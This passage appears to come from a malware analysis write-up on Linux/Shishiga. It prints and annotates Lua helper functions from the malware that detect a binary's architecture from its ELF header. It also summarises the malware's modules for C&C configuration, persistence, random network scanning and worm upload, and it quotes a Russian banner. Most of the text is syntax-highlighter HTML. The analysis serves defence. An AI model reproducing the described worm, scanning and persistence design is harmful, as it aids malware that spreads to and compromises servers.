	local bits,denc,ver,ftype,farch
	if text==nil then
		return nil
	end

	local i=text:find("\x7fELF") 1
	if i~=nil then
		bits,denc,ver=string.unpack("&amp;lt;BBB",text:sub(i+4))
		if denc==1 then
			ftype,farch=string.unpack("&amp;lt;HH",text:sub(i+16)) 2
		else
			ftype,farch=string.unpack("&amp;gt;HH",text:sub(i+16))
		end
	end
	return bits,denc,farch 3
end</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282d8664343156-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d8664343156-2">2</div><div class="crayon-num" data-line="crayon-60581b86282d8664343156-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d8664343156-4">4</div><div class="crayon-num" data-line="crayon-60581b86282d8664343156-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d8664343156-6">6</div><div class="crayon-num" data-line="crayon-60581b86282d8664343156-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d8664343156-8">8</div><div class="crayon-num" data-line="crayon-60581b86282d8664343156-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d8664343156-10">10</div><div class="crayon-num" data-line="crayon-60581b86282d8664343156-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d8664343156-12">12</div><div class="crayon-num" data-line="crayon-60581b86282d8664343156-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d8664343156-14">14</div><div class="crayon-num" data-line="crayon-60581b86282d8664343156-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d8664343156-16">16</div><div class="crayon-num" data-line="crayon-60581b86282d8664343156-17">17</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282d8664343156-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-v">bfssh</span><span class="crayon-sy">.</span><span class="crayon-e">getArchELF</span><span class="crayon-sy">(</span><span class="crayon-v">text</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d8664343156-2"><span class="crayon-h">	</span><span class="crayon-e">local </span><span class="crayon-v">bits</span><span class="crayon-sy">,</span><span class="crayon-v">denc</span><span class="crayon-sy">,</span><span class="crayon-v">ver</span><span class="crayon-sy">,</span><span class="crayon-v">ftype</span><span class="crayon-sy">,</span><span class="crayon-e">farch</span></div><div class="crayon-line" id="crayon-60581b86282d8664343156-3"><span class="crayon-e">	</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">text</span><span class="crayon-o">==</span><span class="crayon-e">nil </span><span class="crayon-st">then</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d8664343156-4"><span class="crayon-h">		</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">nil</span></div><div class="crayon-line" id="crayon-60581b86282d8664343156-5"><span class="crayon-e">	</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d8664343156-6">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d8664343156-7"><span class="crayon-h">	</span><span class="crayon-i">local</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-o">=</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-e">find</span><span class="crayon-sy">(</span><span class="crayon-s">"\x7fELF"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d8664343156-8"><span class="crayon-h">	</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-o">~</span><span class="crayon-o">=</span><span class="crayon-e">nil </span><span class="crayon-st">then</span></div><div class="crayon-line" id="crayon-60581b86282d8664343156-9"><span class="crayon-h">		</span><span class="crayon-v">bits</span><span class="crayon-sy">,</span><span class="crayon-v">denc</span><span class="crayon-sy">,</span><span class="crayon-v">ver</span><span class="crayon-o">=</span><span class="crayon-t">string</span><span class="crayon-sy">.</span><span class="crayon-e">unpack</span><span class="crayon-sy">(</span><span class="crayon-s">"&amp;lt;BBB"</span><span class="crayon-sy">,</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-e">sub</span><span class="crayon-sy">(</span><span class="crayon-v">i</span><span class="crayon-o">+</span><span class="crayon-cn">4</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d8664343156-10"><span class="crayon-h">		</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">denc</span><span class="crayon-o">==</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-st">then</span></div><div class="crayon-line" id="crayon-60581b86282d8664343156-11"><span class="crayon-h">			</span><span class="crayon-v">ftype</span><span class="crayon-sy">,</span><span class="crayon-v">farch</span><span class="crayon-o">=</span><span class="crayon-t">string</span><span class="crayon-sy">.</span><span class="crayon-e">unpack</span><span class="crayon-sy">(</span><span class="crayon-s">"&amp;lt;HH"</span><span class="crayon-sy">,</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-e">sub</span><span class="crayon-sy">(</span><span class="crayon-v">i</span><span class="crayon-o">+</span><span class="crayon-cn">16</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-cn">2</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d8664343156-12"><span class="crayon-h">		</span><span class="crayon-st">else</span></div><div class="crayon-line" id="crayon-60581b86282d8664343156-13"><span class="crayon-h">			</span><span class="crayon-v">ftype</span><span class="crayon-sy">,</span><span class="crayon-v">farch</span><span class="crayon-o">=</span><span class="crayon-t">string</span><span class="crayon-sy">.</span><span class="crayon-e">unpack</span><span class="crayon-sy">(</span><span class="crayon-s">"&amp;gt;HH"</span><span class="crayon-sy">,</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-e">sub</span><span class="crayon-sy">(</span><span class="crayon-v">i</span><span class="crayon-o">+</span><span class="crayon-cn">16</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d8664343156-14"><span class="crayon-h">		</span><span class="crayon-st">end</span></div><div class="crayon-line" id="crayon-60581b86282d8664343156-15"><span class="crayon-h">	</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d8664343156-16"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">bits</span><span class="crayon-sy">,</span><span class="crayon-v">denc</span><span class="crayon-sy">,</span><span class="crayon-i">farch</span><span class="crayon-h"> </span><span class="crayon-cn">3</span></div><div class="crayon-line" id="crayon-60581b86282d8664343156-17"><span class="crayon-st">end</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->

</div>
<div class="sect1">
<div class="sectionbody">
<div class="colist arabic">
<table>
<tbody>
<tr>
<td><b>(1)</b></td>
<td>every ELF file has to start with <code>\x7fELF</code></td>
</tr>
<tr>
<td><b>(2)</b></td>
<td><code>ftype</code> that represents <code>e_type</code> (ELF file type = executable, shared etc.) is not used</td>
</tr>
<tr>
<td><b>(3)</b></td>
<td><code>bits</code> represents <code>e_ident[EI_CLASS]</code> (32-bit or 64-bit), <code>denc</code> represents <code>e_ident[EI_DATA]</code> (little or big endian), and <code>farch</code> represents <code>e_machine</code> in the ELF header</td>
</tr>
</tbody>
</table>
</div>
<div class="listingblock">
<div></div>
<div class="title">bfssh.lua, getArchName method</div>
</div>
</div>
<div>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282d9563686220" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function bfssh.getArchName(bits,denc,farch) 1

        if farch==0x8 and denc==1 then 2
                return "mipsel"
        end

        if farch==0x8 and denc==2 then
                return "mips"
        end

        if farch==0x28 then
                return "armv4l"
        end

        if farch==0x2 then
                return "sparc"
        end

        if farch==0x2a then
                return "sh4"
        end

        if farch==0x4 then
                return "m68k"
        end

        if farch==0x14 then
                return "powerpc"
        end


        if farch==0x3 or farch==0x7 or farch==0x3e then 3
                return "i686"
        end

        return nil
end</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282d9563686220-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-2">2</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-4">4</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-6">6</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-8">8</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-10">10</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-12">12</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-14">14</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-16">16</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-18">18</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-20">20</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-22">22</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-24">24</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-26">26</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-28">28</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-30">30</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-32">32</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-34">34</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d9563686220-36">36</div><div class="crayon-num" data-line="crayon-60581b86282d9563686220-37">37</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282d9563686220-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-v">bfssh</span><span class="crayon-sy">.</span><span class="crayon-e">getArchName</span><span class="crayon-sy">(</span><span class="crayon-v">bits</span><span class="crayon-sy">,</span><span class="crayon-v">denc</span><span class="crayon-sy">,</span><span class="crayon-v">farch</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-2">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d9563686220-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">farch</span><span class="crayon-o">==</span><span class="crayon-cn">0x8</span><span class="crayon-h"> </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-v">denc</span><span class="crayon-o">==</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-st">then</span><span class="crayon-h"> </span><span class="crayon-cn">2</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"mipsel"</span></div><div class="crayon-line" id="crayon-60581b86282d9563686220-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-6">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d9563686220-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">farch</span><span class="crayon-o">==</span><span class="crayon-cn">0x8</span><span class="crayon-h"> </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-v">denc</span><span class="crayon-o">==</span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-st">then</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"mips"</span></div><div class="crayon-line" id="crayon-60581b86282d9563686220-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-10">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d9563686220-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">farch</span><span class="crayon-o">==</span><span class="crayon-cn">0x28</span><span class="crayon-h"> </span><span class="crayon-st">then</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"armv4l"</span></div><div class="crayon-line" id="crayon-60581b86282d9563686220-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-14">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d9563686220-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">farch</span><span class="crayon-o">==</span><span class="crayon-cn">0x2</span><span class="crayon-h"> </span><span class="crayon-st">then</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"sparc"</span></div><div class="crayon-line" id="crayon-60581b86282d9563686220-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-18">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d9563686220-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">farch</span><span class="crayon-o">==</span><span class="crayon-cn">0x2a</span><span class="crayon-h"> </span><span class="crayon-st">then</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"sh4"</span></div><div class="crayon-line" id="crayon-60581b86282d9563686220-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-22">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d9563686220-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">farch</span><span class="crayon-o">==</span><span class="crayon-cn">0x4</span><span class="crayon-h"> </span><span class="crayon-st">then</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"m68k"</span></div><div class="crayon-line" id="crayon-60581b86282d9563686220-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-26">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d9563686220-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">farch</span><span class="crayon-o">==</span><span class="crayon-cn">0x14</span><span class="crayon-h"> </span><span class="crayon-st">then</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"powerpc"</span></div><div class="crayon-line" id="crayon-60581b86282d9563686220-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-30">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d9563686220-31">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">farch</span><span class="crayon-o">==</span><span class="crayon-cn">0x3</span><span class="crayon-h"> </span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-v">farch</span><span class="crayon-o">==</span><span class="crayon-cn">0x7</span><span class="crayon-h"> </span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-v">farch</span><span class="crayon-o">==</span><span class="crayon-cn">0x3e</span><span class="crayon-h"> </span><span class="crayon-st">then</span><span class="crayon-h"> </span><span class="crayon-cn">3</span></div><div class="crayon-line" id="crayon-60581b86282d9563686220-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"i686"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line" id="crayon-60581b86282d9563686220-35">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d9563686220-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">nil</span></div><div class="crayon-line" id="crayon-60581b86282d9563686220-37"><span class="crayon-st">end</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->

</div>
<div class="sectionbody">
<div class="colist arabic">
<table>
<tbody>
<tr>
<td><b>(1)</b></td>
<td><code>bits</code> is not used</td>
</tr>
<tr>
<td><b>(2)</b></td>
<td>check if file is for MIPS little endian (<code>e_machine</code> == <code>EM_MIPS</code> and <code>e_ident[EI_DATA]</code> == <code>ELFDATA2LSB</code>)</td>
</tr>
<tr>
<td><b>(3)</b></td>
<td>check if file is for Intel 80386 or Intel 80860 or AMD x86-64 (<code>e_machine</code> == <code>EM_386</code> or <code>e_machine</code> == <code>EM_860</code> or <code>e_machine</code> == <code>EM_X86_64</code>)</td>
</tr>
</tbody>
</table>
</div>
<div class="paragraph">
<p><strong>config.lua</strong></p>
</div>
<div class="ulist">
<ul>
<li>contains <strong>publicKey</strong> to verify the signature of the binary (.lm or .dm);</li>
<li>contains bootstrap nodes list;</li>
<li>contains filenames of .bt files, port numbers of SOCKS and HTTP server;</li>
<li>contains IP address of the server (probably C&amp;C server);</li>
</ul>
</div>
<div class="paragraph">
<p><strong>persist.lua</strong></p>
</div>
<div class="ulist">
<ul>
<li>persistence method depending on the privilege (root or user)</li>
</ul>
</div>
<div class="paragraph">
<p><strong>scanner.lua</strong></p>
</div>
<div class="ulist">
<ul>
<li>used to generate random /16 networks that are not local</li>
</ul>
</div>
<div class="paragraph">
<p><strong>worm.lua</strong> (this script was removed in the latest version of Linux/Shishiga)</p>
</div>
<div class="ulist">
<ul>
<li>allows scanning on a given port;</li>
<li>allows upload;</li>
<li>gets information from the new infected server;</li>
</ul>
</div>
<div class="paragraph">
<p>The <code>readme.lua</code> script has a message banner that grabs your attention, if you speak Russian:</p>
</div>
<div class="listingblock">
<div class="content">
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282da700930341" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
           ВСЁ ИДЁТ ПО ПЛАНУ

А при коммунизме всё будет заебись
Он наступит скоро — надо только подождать
Там всё будет бесплатно,там всё будет в кайф
Там наверное вощще не надо будет (умирать)
Я проснулся среди ночи и понял, что -

           ВСЁ ИДЁТ ПО ПЛАНУ</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282da700930341-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282da700930341-2">2</div><div class="crayon-num" data-line="crayon-60581b86282da700930341-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282da700930341-4">4</div><div class="crayon-num" data-line="crayon-60581b86282da700930341-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282da700930341-6">6</div><div class="crayon-num" data-line="crayon-60581b86282da700930341-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282da700930341-8">8</div><div class="crayon-num" data-line="crayon-60581b86282da700930341-9">9</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282da700930341-1"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>ВСЁ<span class="crayon-h"> </span>ИДЁТ<span class="crayon-h"> </span>ПО<span class="crayon-h"> </span>ПЛАНУ</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282da700930341-2">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282da700930341-3">А<span class="crayon-h"> </span>при<span class="crayon-h"> </span>коммунизме<span class="crayon-h"> </span>всё<span class="crayon-h"> </span>будет<span class="crayon-h"> </span>заебись</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282da700930341-4">Он<span class="crayon-h"> </span>наступит<span class="crayon-h"> </span>скоро<span class="crayon-h"> </span>—<span class="crayon-h"> </span>надо<span class="crayon-h"> </span>только<span class="crayon-h"> </span>подождать</div><div class="crayon-line" id="crayon-60581b86282da700930341-5">Там<span class="crayon-h"> </span>всё<span class="crayon-h"> </span>будет<span class="crayon-h"> </span>бесплатно<span class="crayon-sy">,</span>там<span class="crayon-h"> </span>всё<span class="crayon-h"> </span>будет<span class="crayon-h"> </span>в<span class="crayon-h"> </span>кайф</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282da700930341-6">Там<span class="crayon-h"> </span>наверное<span class="crayon-h"> </span>вощще<span class="crayon-h"> </span>не<span class="crayon-h"> </span>надо<span class="crayon-h"> </span>будет<span class="crayon-h"> </span><span class="crayon-sy">(</span>умирать<span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282da700930341-7">Я<span class="crayon-h"> </span>проснулся<span class="crayon-h"> </span>среди<span class="crayon-h"> </span>ночи<span class="crayon-h"> </span>и<span class="crayon-h"> </span>понял<span class="crayon-sy">,</span><span class="crayon-h"> </span>что<span class="crayon-h"> </span><span class="crayon-o">-</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282da700930341-8">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282da700930341-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>ВСЁ<span class="crayon-h"> </span>ИДЁТ<span class="crayon-h"> </span>ПО<span class="crayon-h"> 